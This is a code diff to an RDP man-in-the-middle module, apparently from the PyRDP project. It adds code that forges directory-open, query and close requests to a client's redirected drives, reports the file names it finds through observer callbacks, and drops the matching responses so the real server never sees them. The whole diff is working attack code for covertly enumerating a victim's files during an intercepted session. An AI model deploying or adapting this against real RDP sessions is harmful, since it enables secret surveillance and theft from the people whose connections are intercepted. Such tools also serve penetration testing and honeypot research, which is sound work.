@@ -8,20 +8,29 @@ import hashlib
 import json
 from logging import LoggerAdapter
 from pathlib import Path
-from typing import Dict
+from typing import Dict, List, Union
 
-from pyrdp.core import decodeUTF16LE, FileProxy, ObservedBy, Observer, Subject
-from pyrdp.enum import CreateOption, DeviceType, FileAccess, IOOperationSeverity, MajorFunction
+from pyrdp.core import FileProxy, ObservedBy, Observer, Subject
+from pyrdp.enum import CreateOption, DeviceType, DirectoryAccessMask, FileAccessMask, FileAttributes, \
+    FileCreateDisposition, FileCreateOptions, FileShareAccess, FileSystemInformationClass, IOOperationSeverity, \
+    MajorFunction, MinorFunction
 from pyrdp.layer import DeviceRedirectionLayer
 from pyrdp.mitm.config import MITMConfig
 from pyrdp.mitm.FileMapping import FileMapping, FileMappingDecoder, FileMappingEncoder
 from pyrdp.pdu import DeviceAnnounce, DeviceCloseRequestPDU, DeviceCloseResponsePDU, DeviceCreateRequestPDU, \
-    DeviceCreateResponsePDU, DeviceIORequestPDU, DeviceIOResponsePDU, DeviceListAnnounceRequest, DeviceReadRequestPDU, \
+    DeviceCreateResponsePDU, DeviceDirectoryControlResponsePDU, DeviceIORequestPDU, DeviceIOResponsePDU, \
+    DeviceListAnnounceRequest, DeviceQueryDirectoryRequestPDU, DeviceQueryDirectoryResponsePDU, DeviceReadRequestPDU, \
     DeviceReadResponsePDU, DeviceRedirectionPDU
 
 
 class DeviceRedirectionMITMObserver(Observer):
     def onDeviceAnnounce(self, device: DeviceAnnounce):
+        pass
+
+    def onDirectoryListingResult(self, requestID: int, deviceID: int, fileName: str, isDirectory: bool):
+        pass
+
+    def onDirectoryListingComplete(self, requestID: int):
         pass
 
 
@@ -34,6 +43,9 @@ class DeviceRedirectionMITM(Subject):
     file. Each unique file (identified by its hash) is saved only once. Duplicates are removed to avoid filling the drive
     with identical files.
     """
+
+    FORGED_COMPLETION_ID = 1000000
+
 
     def __init__(self, client: DeviceRedirectionLayer, server: DeviceRedirectionLayer, log: LoggerAdapter, config: MITMConfig):
         """
@@ -53,11 +65,15 @@ class DeviceRedirectionMITM(Subject):
         self.openedMappings: Dict[int, FileMapping] = {}
         self.fileMap: Dict[str, FileMapping] = {}
         self.fileMapPath = self.config.outDir / "mapping.json"
+        self.directoryListingRequests: List[int] = []
+        self.directoryListingPaths: Dict[int, str] = {}
+        self.directoryListingFileIDs: Dict[int, int] = {}
 
         self.responseHandlers: Dict[MajorFunction, callable] = {
             MajorFunction.IRP_MJ_CREATE: self.handleCreateResponse,
             MajorFunction.IRP_MJ_READ: self.handleReadResponse,
             MajorFunction.IRP_MJ_CLOSE: self.handleCloseResponse,
+            MajorFunction.IRP_MJ_DIRECTORY_CONTROL: self.handleDirectoryControl,
         }
 
         self.client.createObserver(
@@ -96,15 +112,19 @@ class DeviceRedirectionMITM(Subject):
         :param pdu: the PDU that was received
         :param destination: the destination layer
         """
+        dropPDU = False
 
         if isinstance(pdu, DeviceIORequestPDU) and destination is self.client:
             self.handleIORequest(pdu)
         elif isinstance(pdu, DeviceIOResponsePDU) and destination is self.server:
+            dropPDU = pdu.completionID in self.directoryListingRequests
             self.handleIOResponse(pdu)
+
         elif isinstance(pdu, DeviceListAnnounceRequest):
             self.handleDeviceListAnnounceRequest(pdu)
 
-        destination.sendPDU(pdu)
+        if not dropPDU:
+            destination.sendPDU(pdu)
 
     def handleIORequest(self, pdu: DeviceIORequestPDU):
         """
@@ -121,14 +141,13 @@ class DeviceRedirectionMITM(Subject):
         """
 
         if pdu.completionID in self.currentIORequests:
-            requestPDU = self.currentIORequests[pdu.completionID]
+            requestPDU = self.currentIORequests.pop(pdu.completionID)
+
             if pdu.ioStatus >> 30 == IOOperationSeverity.STATUS_SEVERITY_ERROR:
                 self.log.warning("Received an IO Response with an error IO status: %(responsePDU)s for request %(requestPDU)s", {"responsePDU": repr(pdu), "requestPDU": repr(requestPDU)})
 
             if pdu.majorFunction in self.responseHandlers:
                 self.responseHandlers[pdu.majorFunction](requestPDU, pdu)
-
-            self.currentIORequests.pop(pdu.completionID)
         else:
             self.log.error("Received IO response to unknown request #%(completionID)d", {"completionID": pdu.completionID})
 
@@ -155,12 +174,16 @@ class DeviceRedirectionMITM(Subject):
         :param request: the device create request
         :param response: the device IO response to the request
         """
+        if response.completionID in self.directoryListingRequests:
+            self.handleForgedDirectoryOpen(response)
+            return
 
-        isFileRead = request.desiredAccess & (FileAccess.GENERIC_READ | FileAccess.FILE_READ_DATA) != 0
+
+        isFileRead = request.desiredAccess & (FileAccessMask.GENERIC_READ | FileAccessMask.FILE_READ_DATA) != 0
         isNotDirectory = request.createOptions & CreateOption.FILE_NON_DIRECTORY_FILE != 0
 
         if isFileRead and isNotDirectory:
-            remotePath = Path(decodeUTF16LE(request.path).rstrip("\x00"))
+            remotePath = Path(request.path)
             mapping = FileMapping.generate(remotePath, self.config.fileDir)
             proxy = FileProxy(mapping.localPath, "wb")
 
@@ -195,13 +218,17 @@ class DeviceRedirectionMITM(Subject):
                 self.fileMap[fileName] = mapping
                 self.saveMapping()
 
-    def handleCloseResponse(self, request: DeviceCloseRequestPDU, _: DeviceCloseResponsePDU):
+    def handleCloseResponse(self, request: DeviceCloseRequestPDU, response: DeviceCloseResponsePDU):
         """
         Close the file if it was open. Compute the hash of the file, then delete it if we already have a file with the
         same hash.
         :param request: the device close request
-        :param _: the device IO response to the request
+        :param response: the device IO response to the request
         """
+
+        if response.completionID in self.directoryListingRequests:
+            self.handleForgedDirectoryClose(response)
+            return
 
         if request.fileID in self.openedFiles:
             file = self.openedFiles.pop(request.fileID)
@@ -237,3 +264,126 @@ class DeviceRedirectionMITM(Subject):
                     break
 
             self.saveMapping()
+
+
+    def handleDirectoryControl(self, _: Union[DeviceIORequestPDU, DeviceQueryDirectoryRequestPDU], response: Union[DeviceDirectoryControlResponsePDU, DeviceQueryDirectoryResponsePDU]):
+        if response.minorFunction != MinorFunction.IRP_MN_QUERY_DIRECTORY:
+            return
+
+        if response.completionID not in self.directoryListingRequests:
+            return
+
+        if response.ioStatus == 0:
+            self.handleDirectoryListingResponse(response)
+        else:
+            self.handleDirectoryListingComplete(response)
+
+
+    def sendForgedDirectoryListing(self, deviceID: int, path: str) -> int:
+        """
+        Send a forged directory listing request. Returns a request ID that can be used by the caller to keep track of which
+        file belongs to which directory. Results are sent by using the DeviceRedirectionMITMObserver interface.
+        :param deviceID: ID of the target device.
+        :param path: path of the directory to list. The path should use '\' instead of '/' to separate directories. It
+        should also contain a pattern to match. For example: to list all files in the Documents folder, the path should be
+        \Documents\*
+        """
+
+        completionID = DeviceRedirectionMITM.FORGED_COMPLETION_ID
+
+        while completionID in self.directoryListingRequests:
+            completionID += 1
+
+        self.directoryListingRequests.append(completionID)
+        self.directoryListingPaths[completionID] = path
+
+        if "*" not in path:
+            openPath = path
+        else:
+            openPath = path[: path.index("*")]
+
+        if openPath.endswith("\\"):
+            openPath = path[: -1]
+
+        # We need to start by opening the directory.
+        request = DeviceCreateRequestPDU(
+            deviceID,
+            0,
+            completionID,
+            0,
+            DirectoryAccessMask.FILE_LIST_DIRECTORY,
+            0,
+            FileAttributes.FILE_ATTRIBUTE_DIRECTORY,
+            FileShareAccess(7), # read, write, delete
+            FileCreateDisposition.FILE_OPEN,
+            FileCreateOptions.FILE_DIRECTORY_FILE,
+            openPath
+        )
+
+        # Make sure the request is registered within our own tracking system.
+        self.handleIORequest(request)
+        self.client.sendPDU(request)
+
+        return completionID
+
+    def handleForgedDirectoryOpen(self, openResponse: DeviceCreateResponsePDU):
+        if openResponse.ioStatus != 0:
+            return
+
+        self.directoryListingFileIDs[openResponse.completionID] = openResponse.fileID
+
+        # Now that the file is open, start listing the directory.
+        request = DeviceQueryDirectoryRequestPDU(
+            openResponse.deviceID,
+            openResponse.fileID,
+            openResponse.completionID,
+            FileSystemInformationClass.FileBothDirectoryInformation,
+            1,
+            self.directoryListingPaths[openResponse.completionID]
+        )
+
+        self.handleIORequest(request)
+        self.client.sendPDU(request)
+
+    def handleDirectoryListingResponse(self, response: DeviceQueryDirectoryResponsePDU):
+        for info in response.fileInformation:
+            try:
+                isDirectory = info.fileAttributes & FileAttributes.FILE_ATTRIBUTE_DIRECTORY != 0
+            except AttributeError:
+                isDirectory = False
+
+            self.observer.onDirectoryListingResult(response.completionID, response.deviceID, info.fileName, isDirectory)
+
+        # Send a follow-up request to get the next file (or a nonzero ioStatus, which will complete the listing).
+        pdu = DeviceQueryDirectoryRequestPDU(
+            response.deviceID,
+            self.directoryListingFileIDs[response.completionID],
+            response.completionID,
+            response.informationClass,
+            0,
+            ""
+        )
+
+        self.handleIORequest(pdu)
+        self.client.sendPDU(pdu)
+
+    def handleDirectoryListingComplete(self, response: DeviceQueryDirectoryResponsePDU):
+        fileID = self.directoryListingFileIDs.pop(response.completionID)
+        self.directoryListingPaths.pop(response.completionID)
+
+        self.observer.onDirectoryListingComplete(response.completionID)
+
+        # Once we're done, we can close the file.
+        request = DeviceCloseRequestPDU(
+            response.deviceID,
+            fileID,
+            response.completionID,
+            0
+        )
+
+        self.handleIORequest(request)
+        self.client.sendPDU(request)
+
+    def handleForgedDirectoryClose(self, response: DeviceCloseResponsePDU):
+        # The directory is closed, we can remove the request ID from the list.
+        self.directoryListingRequests.remove(response.completionID)
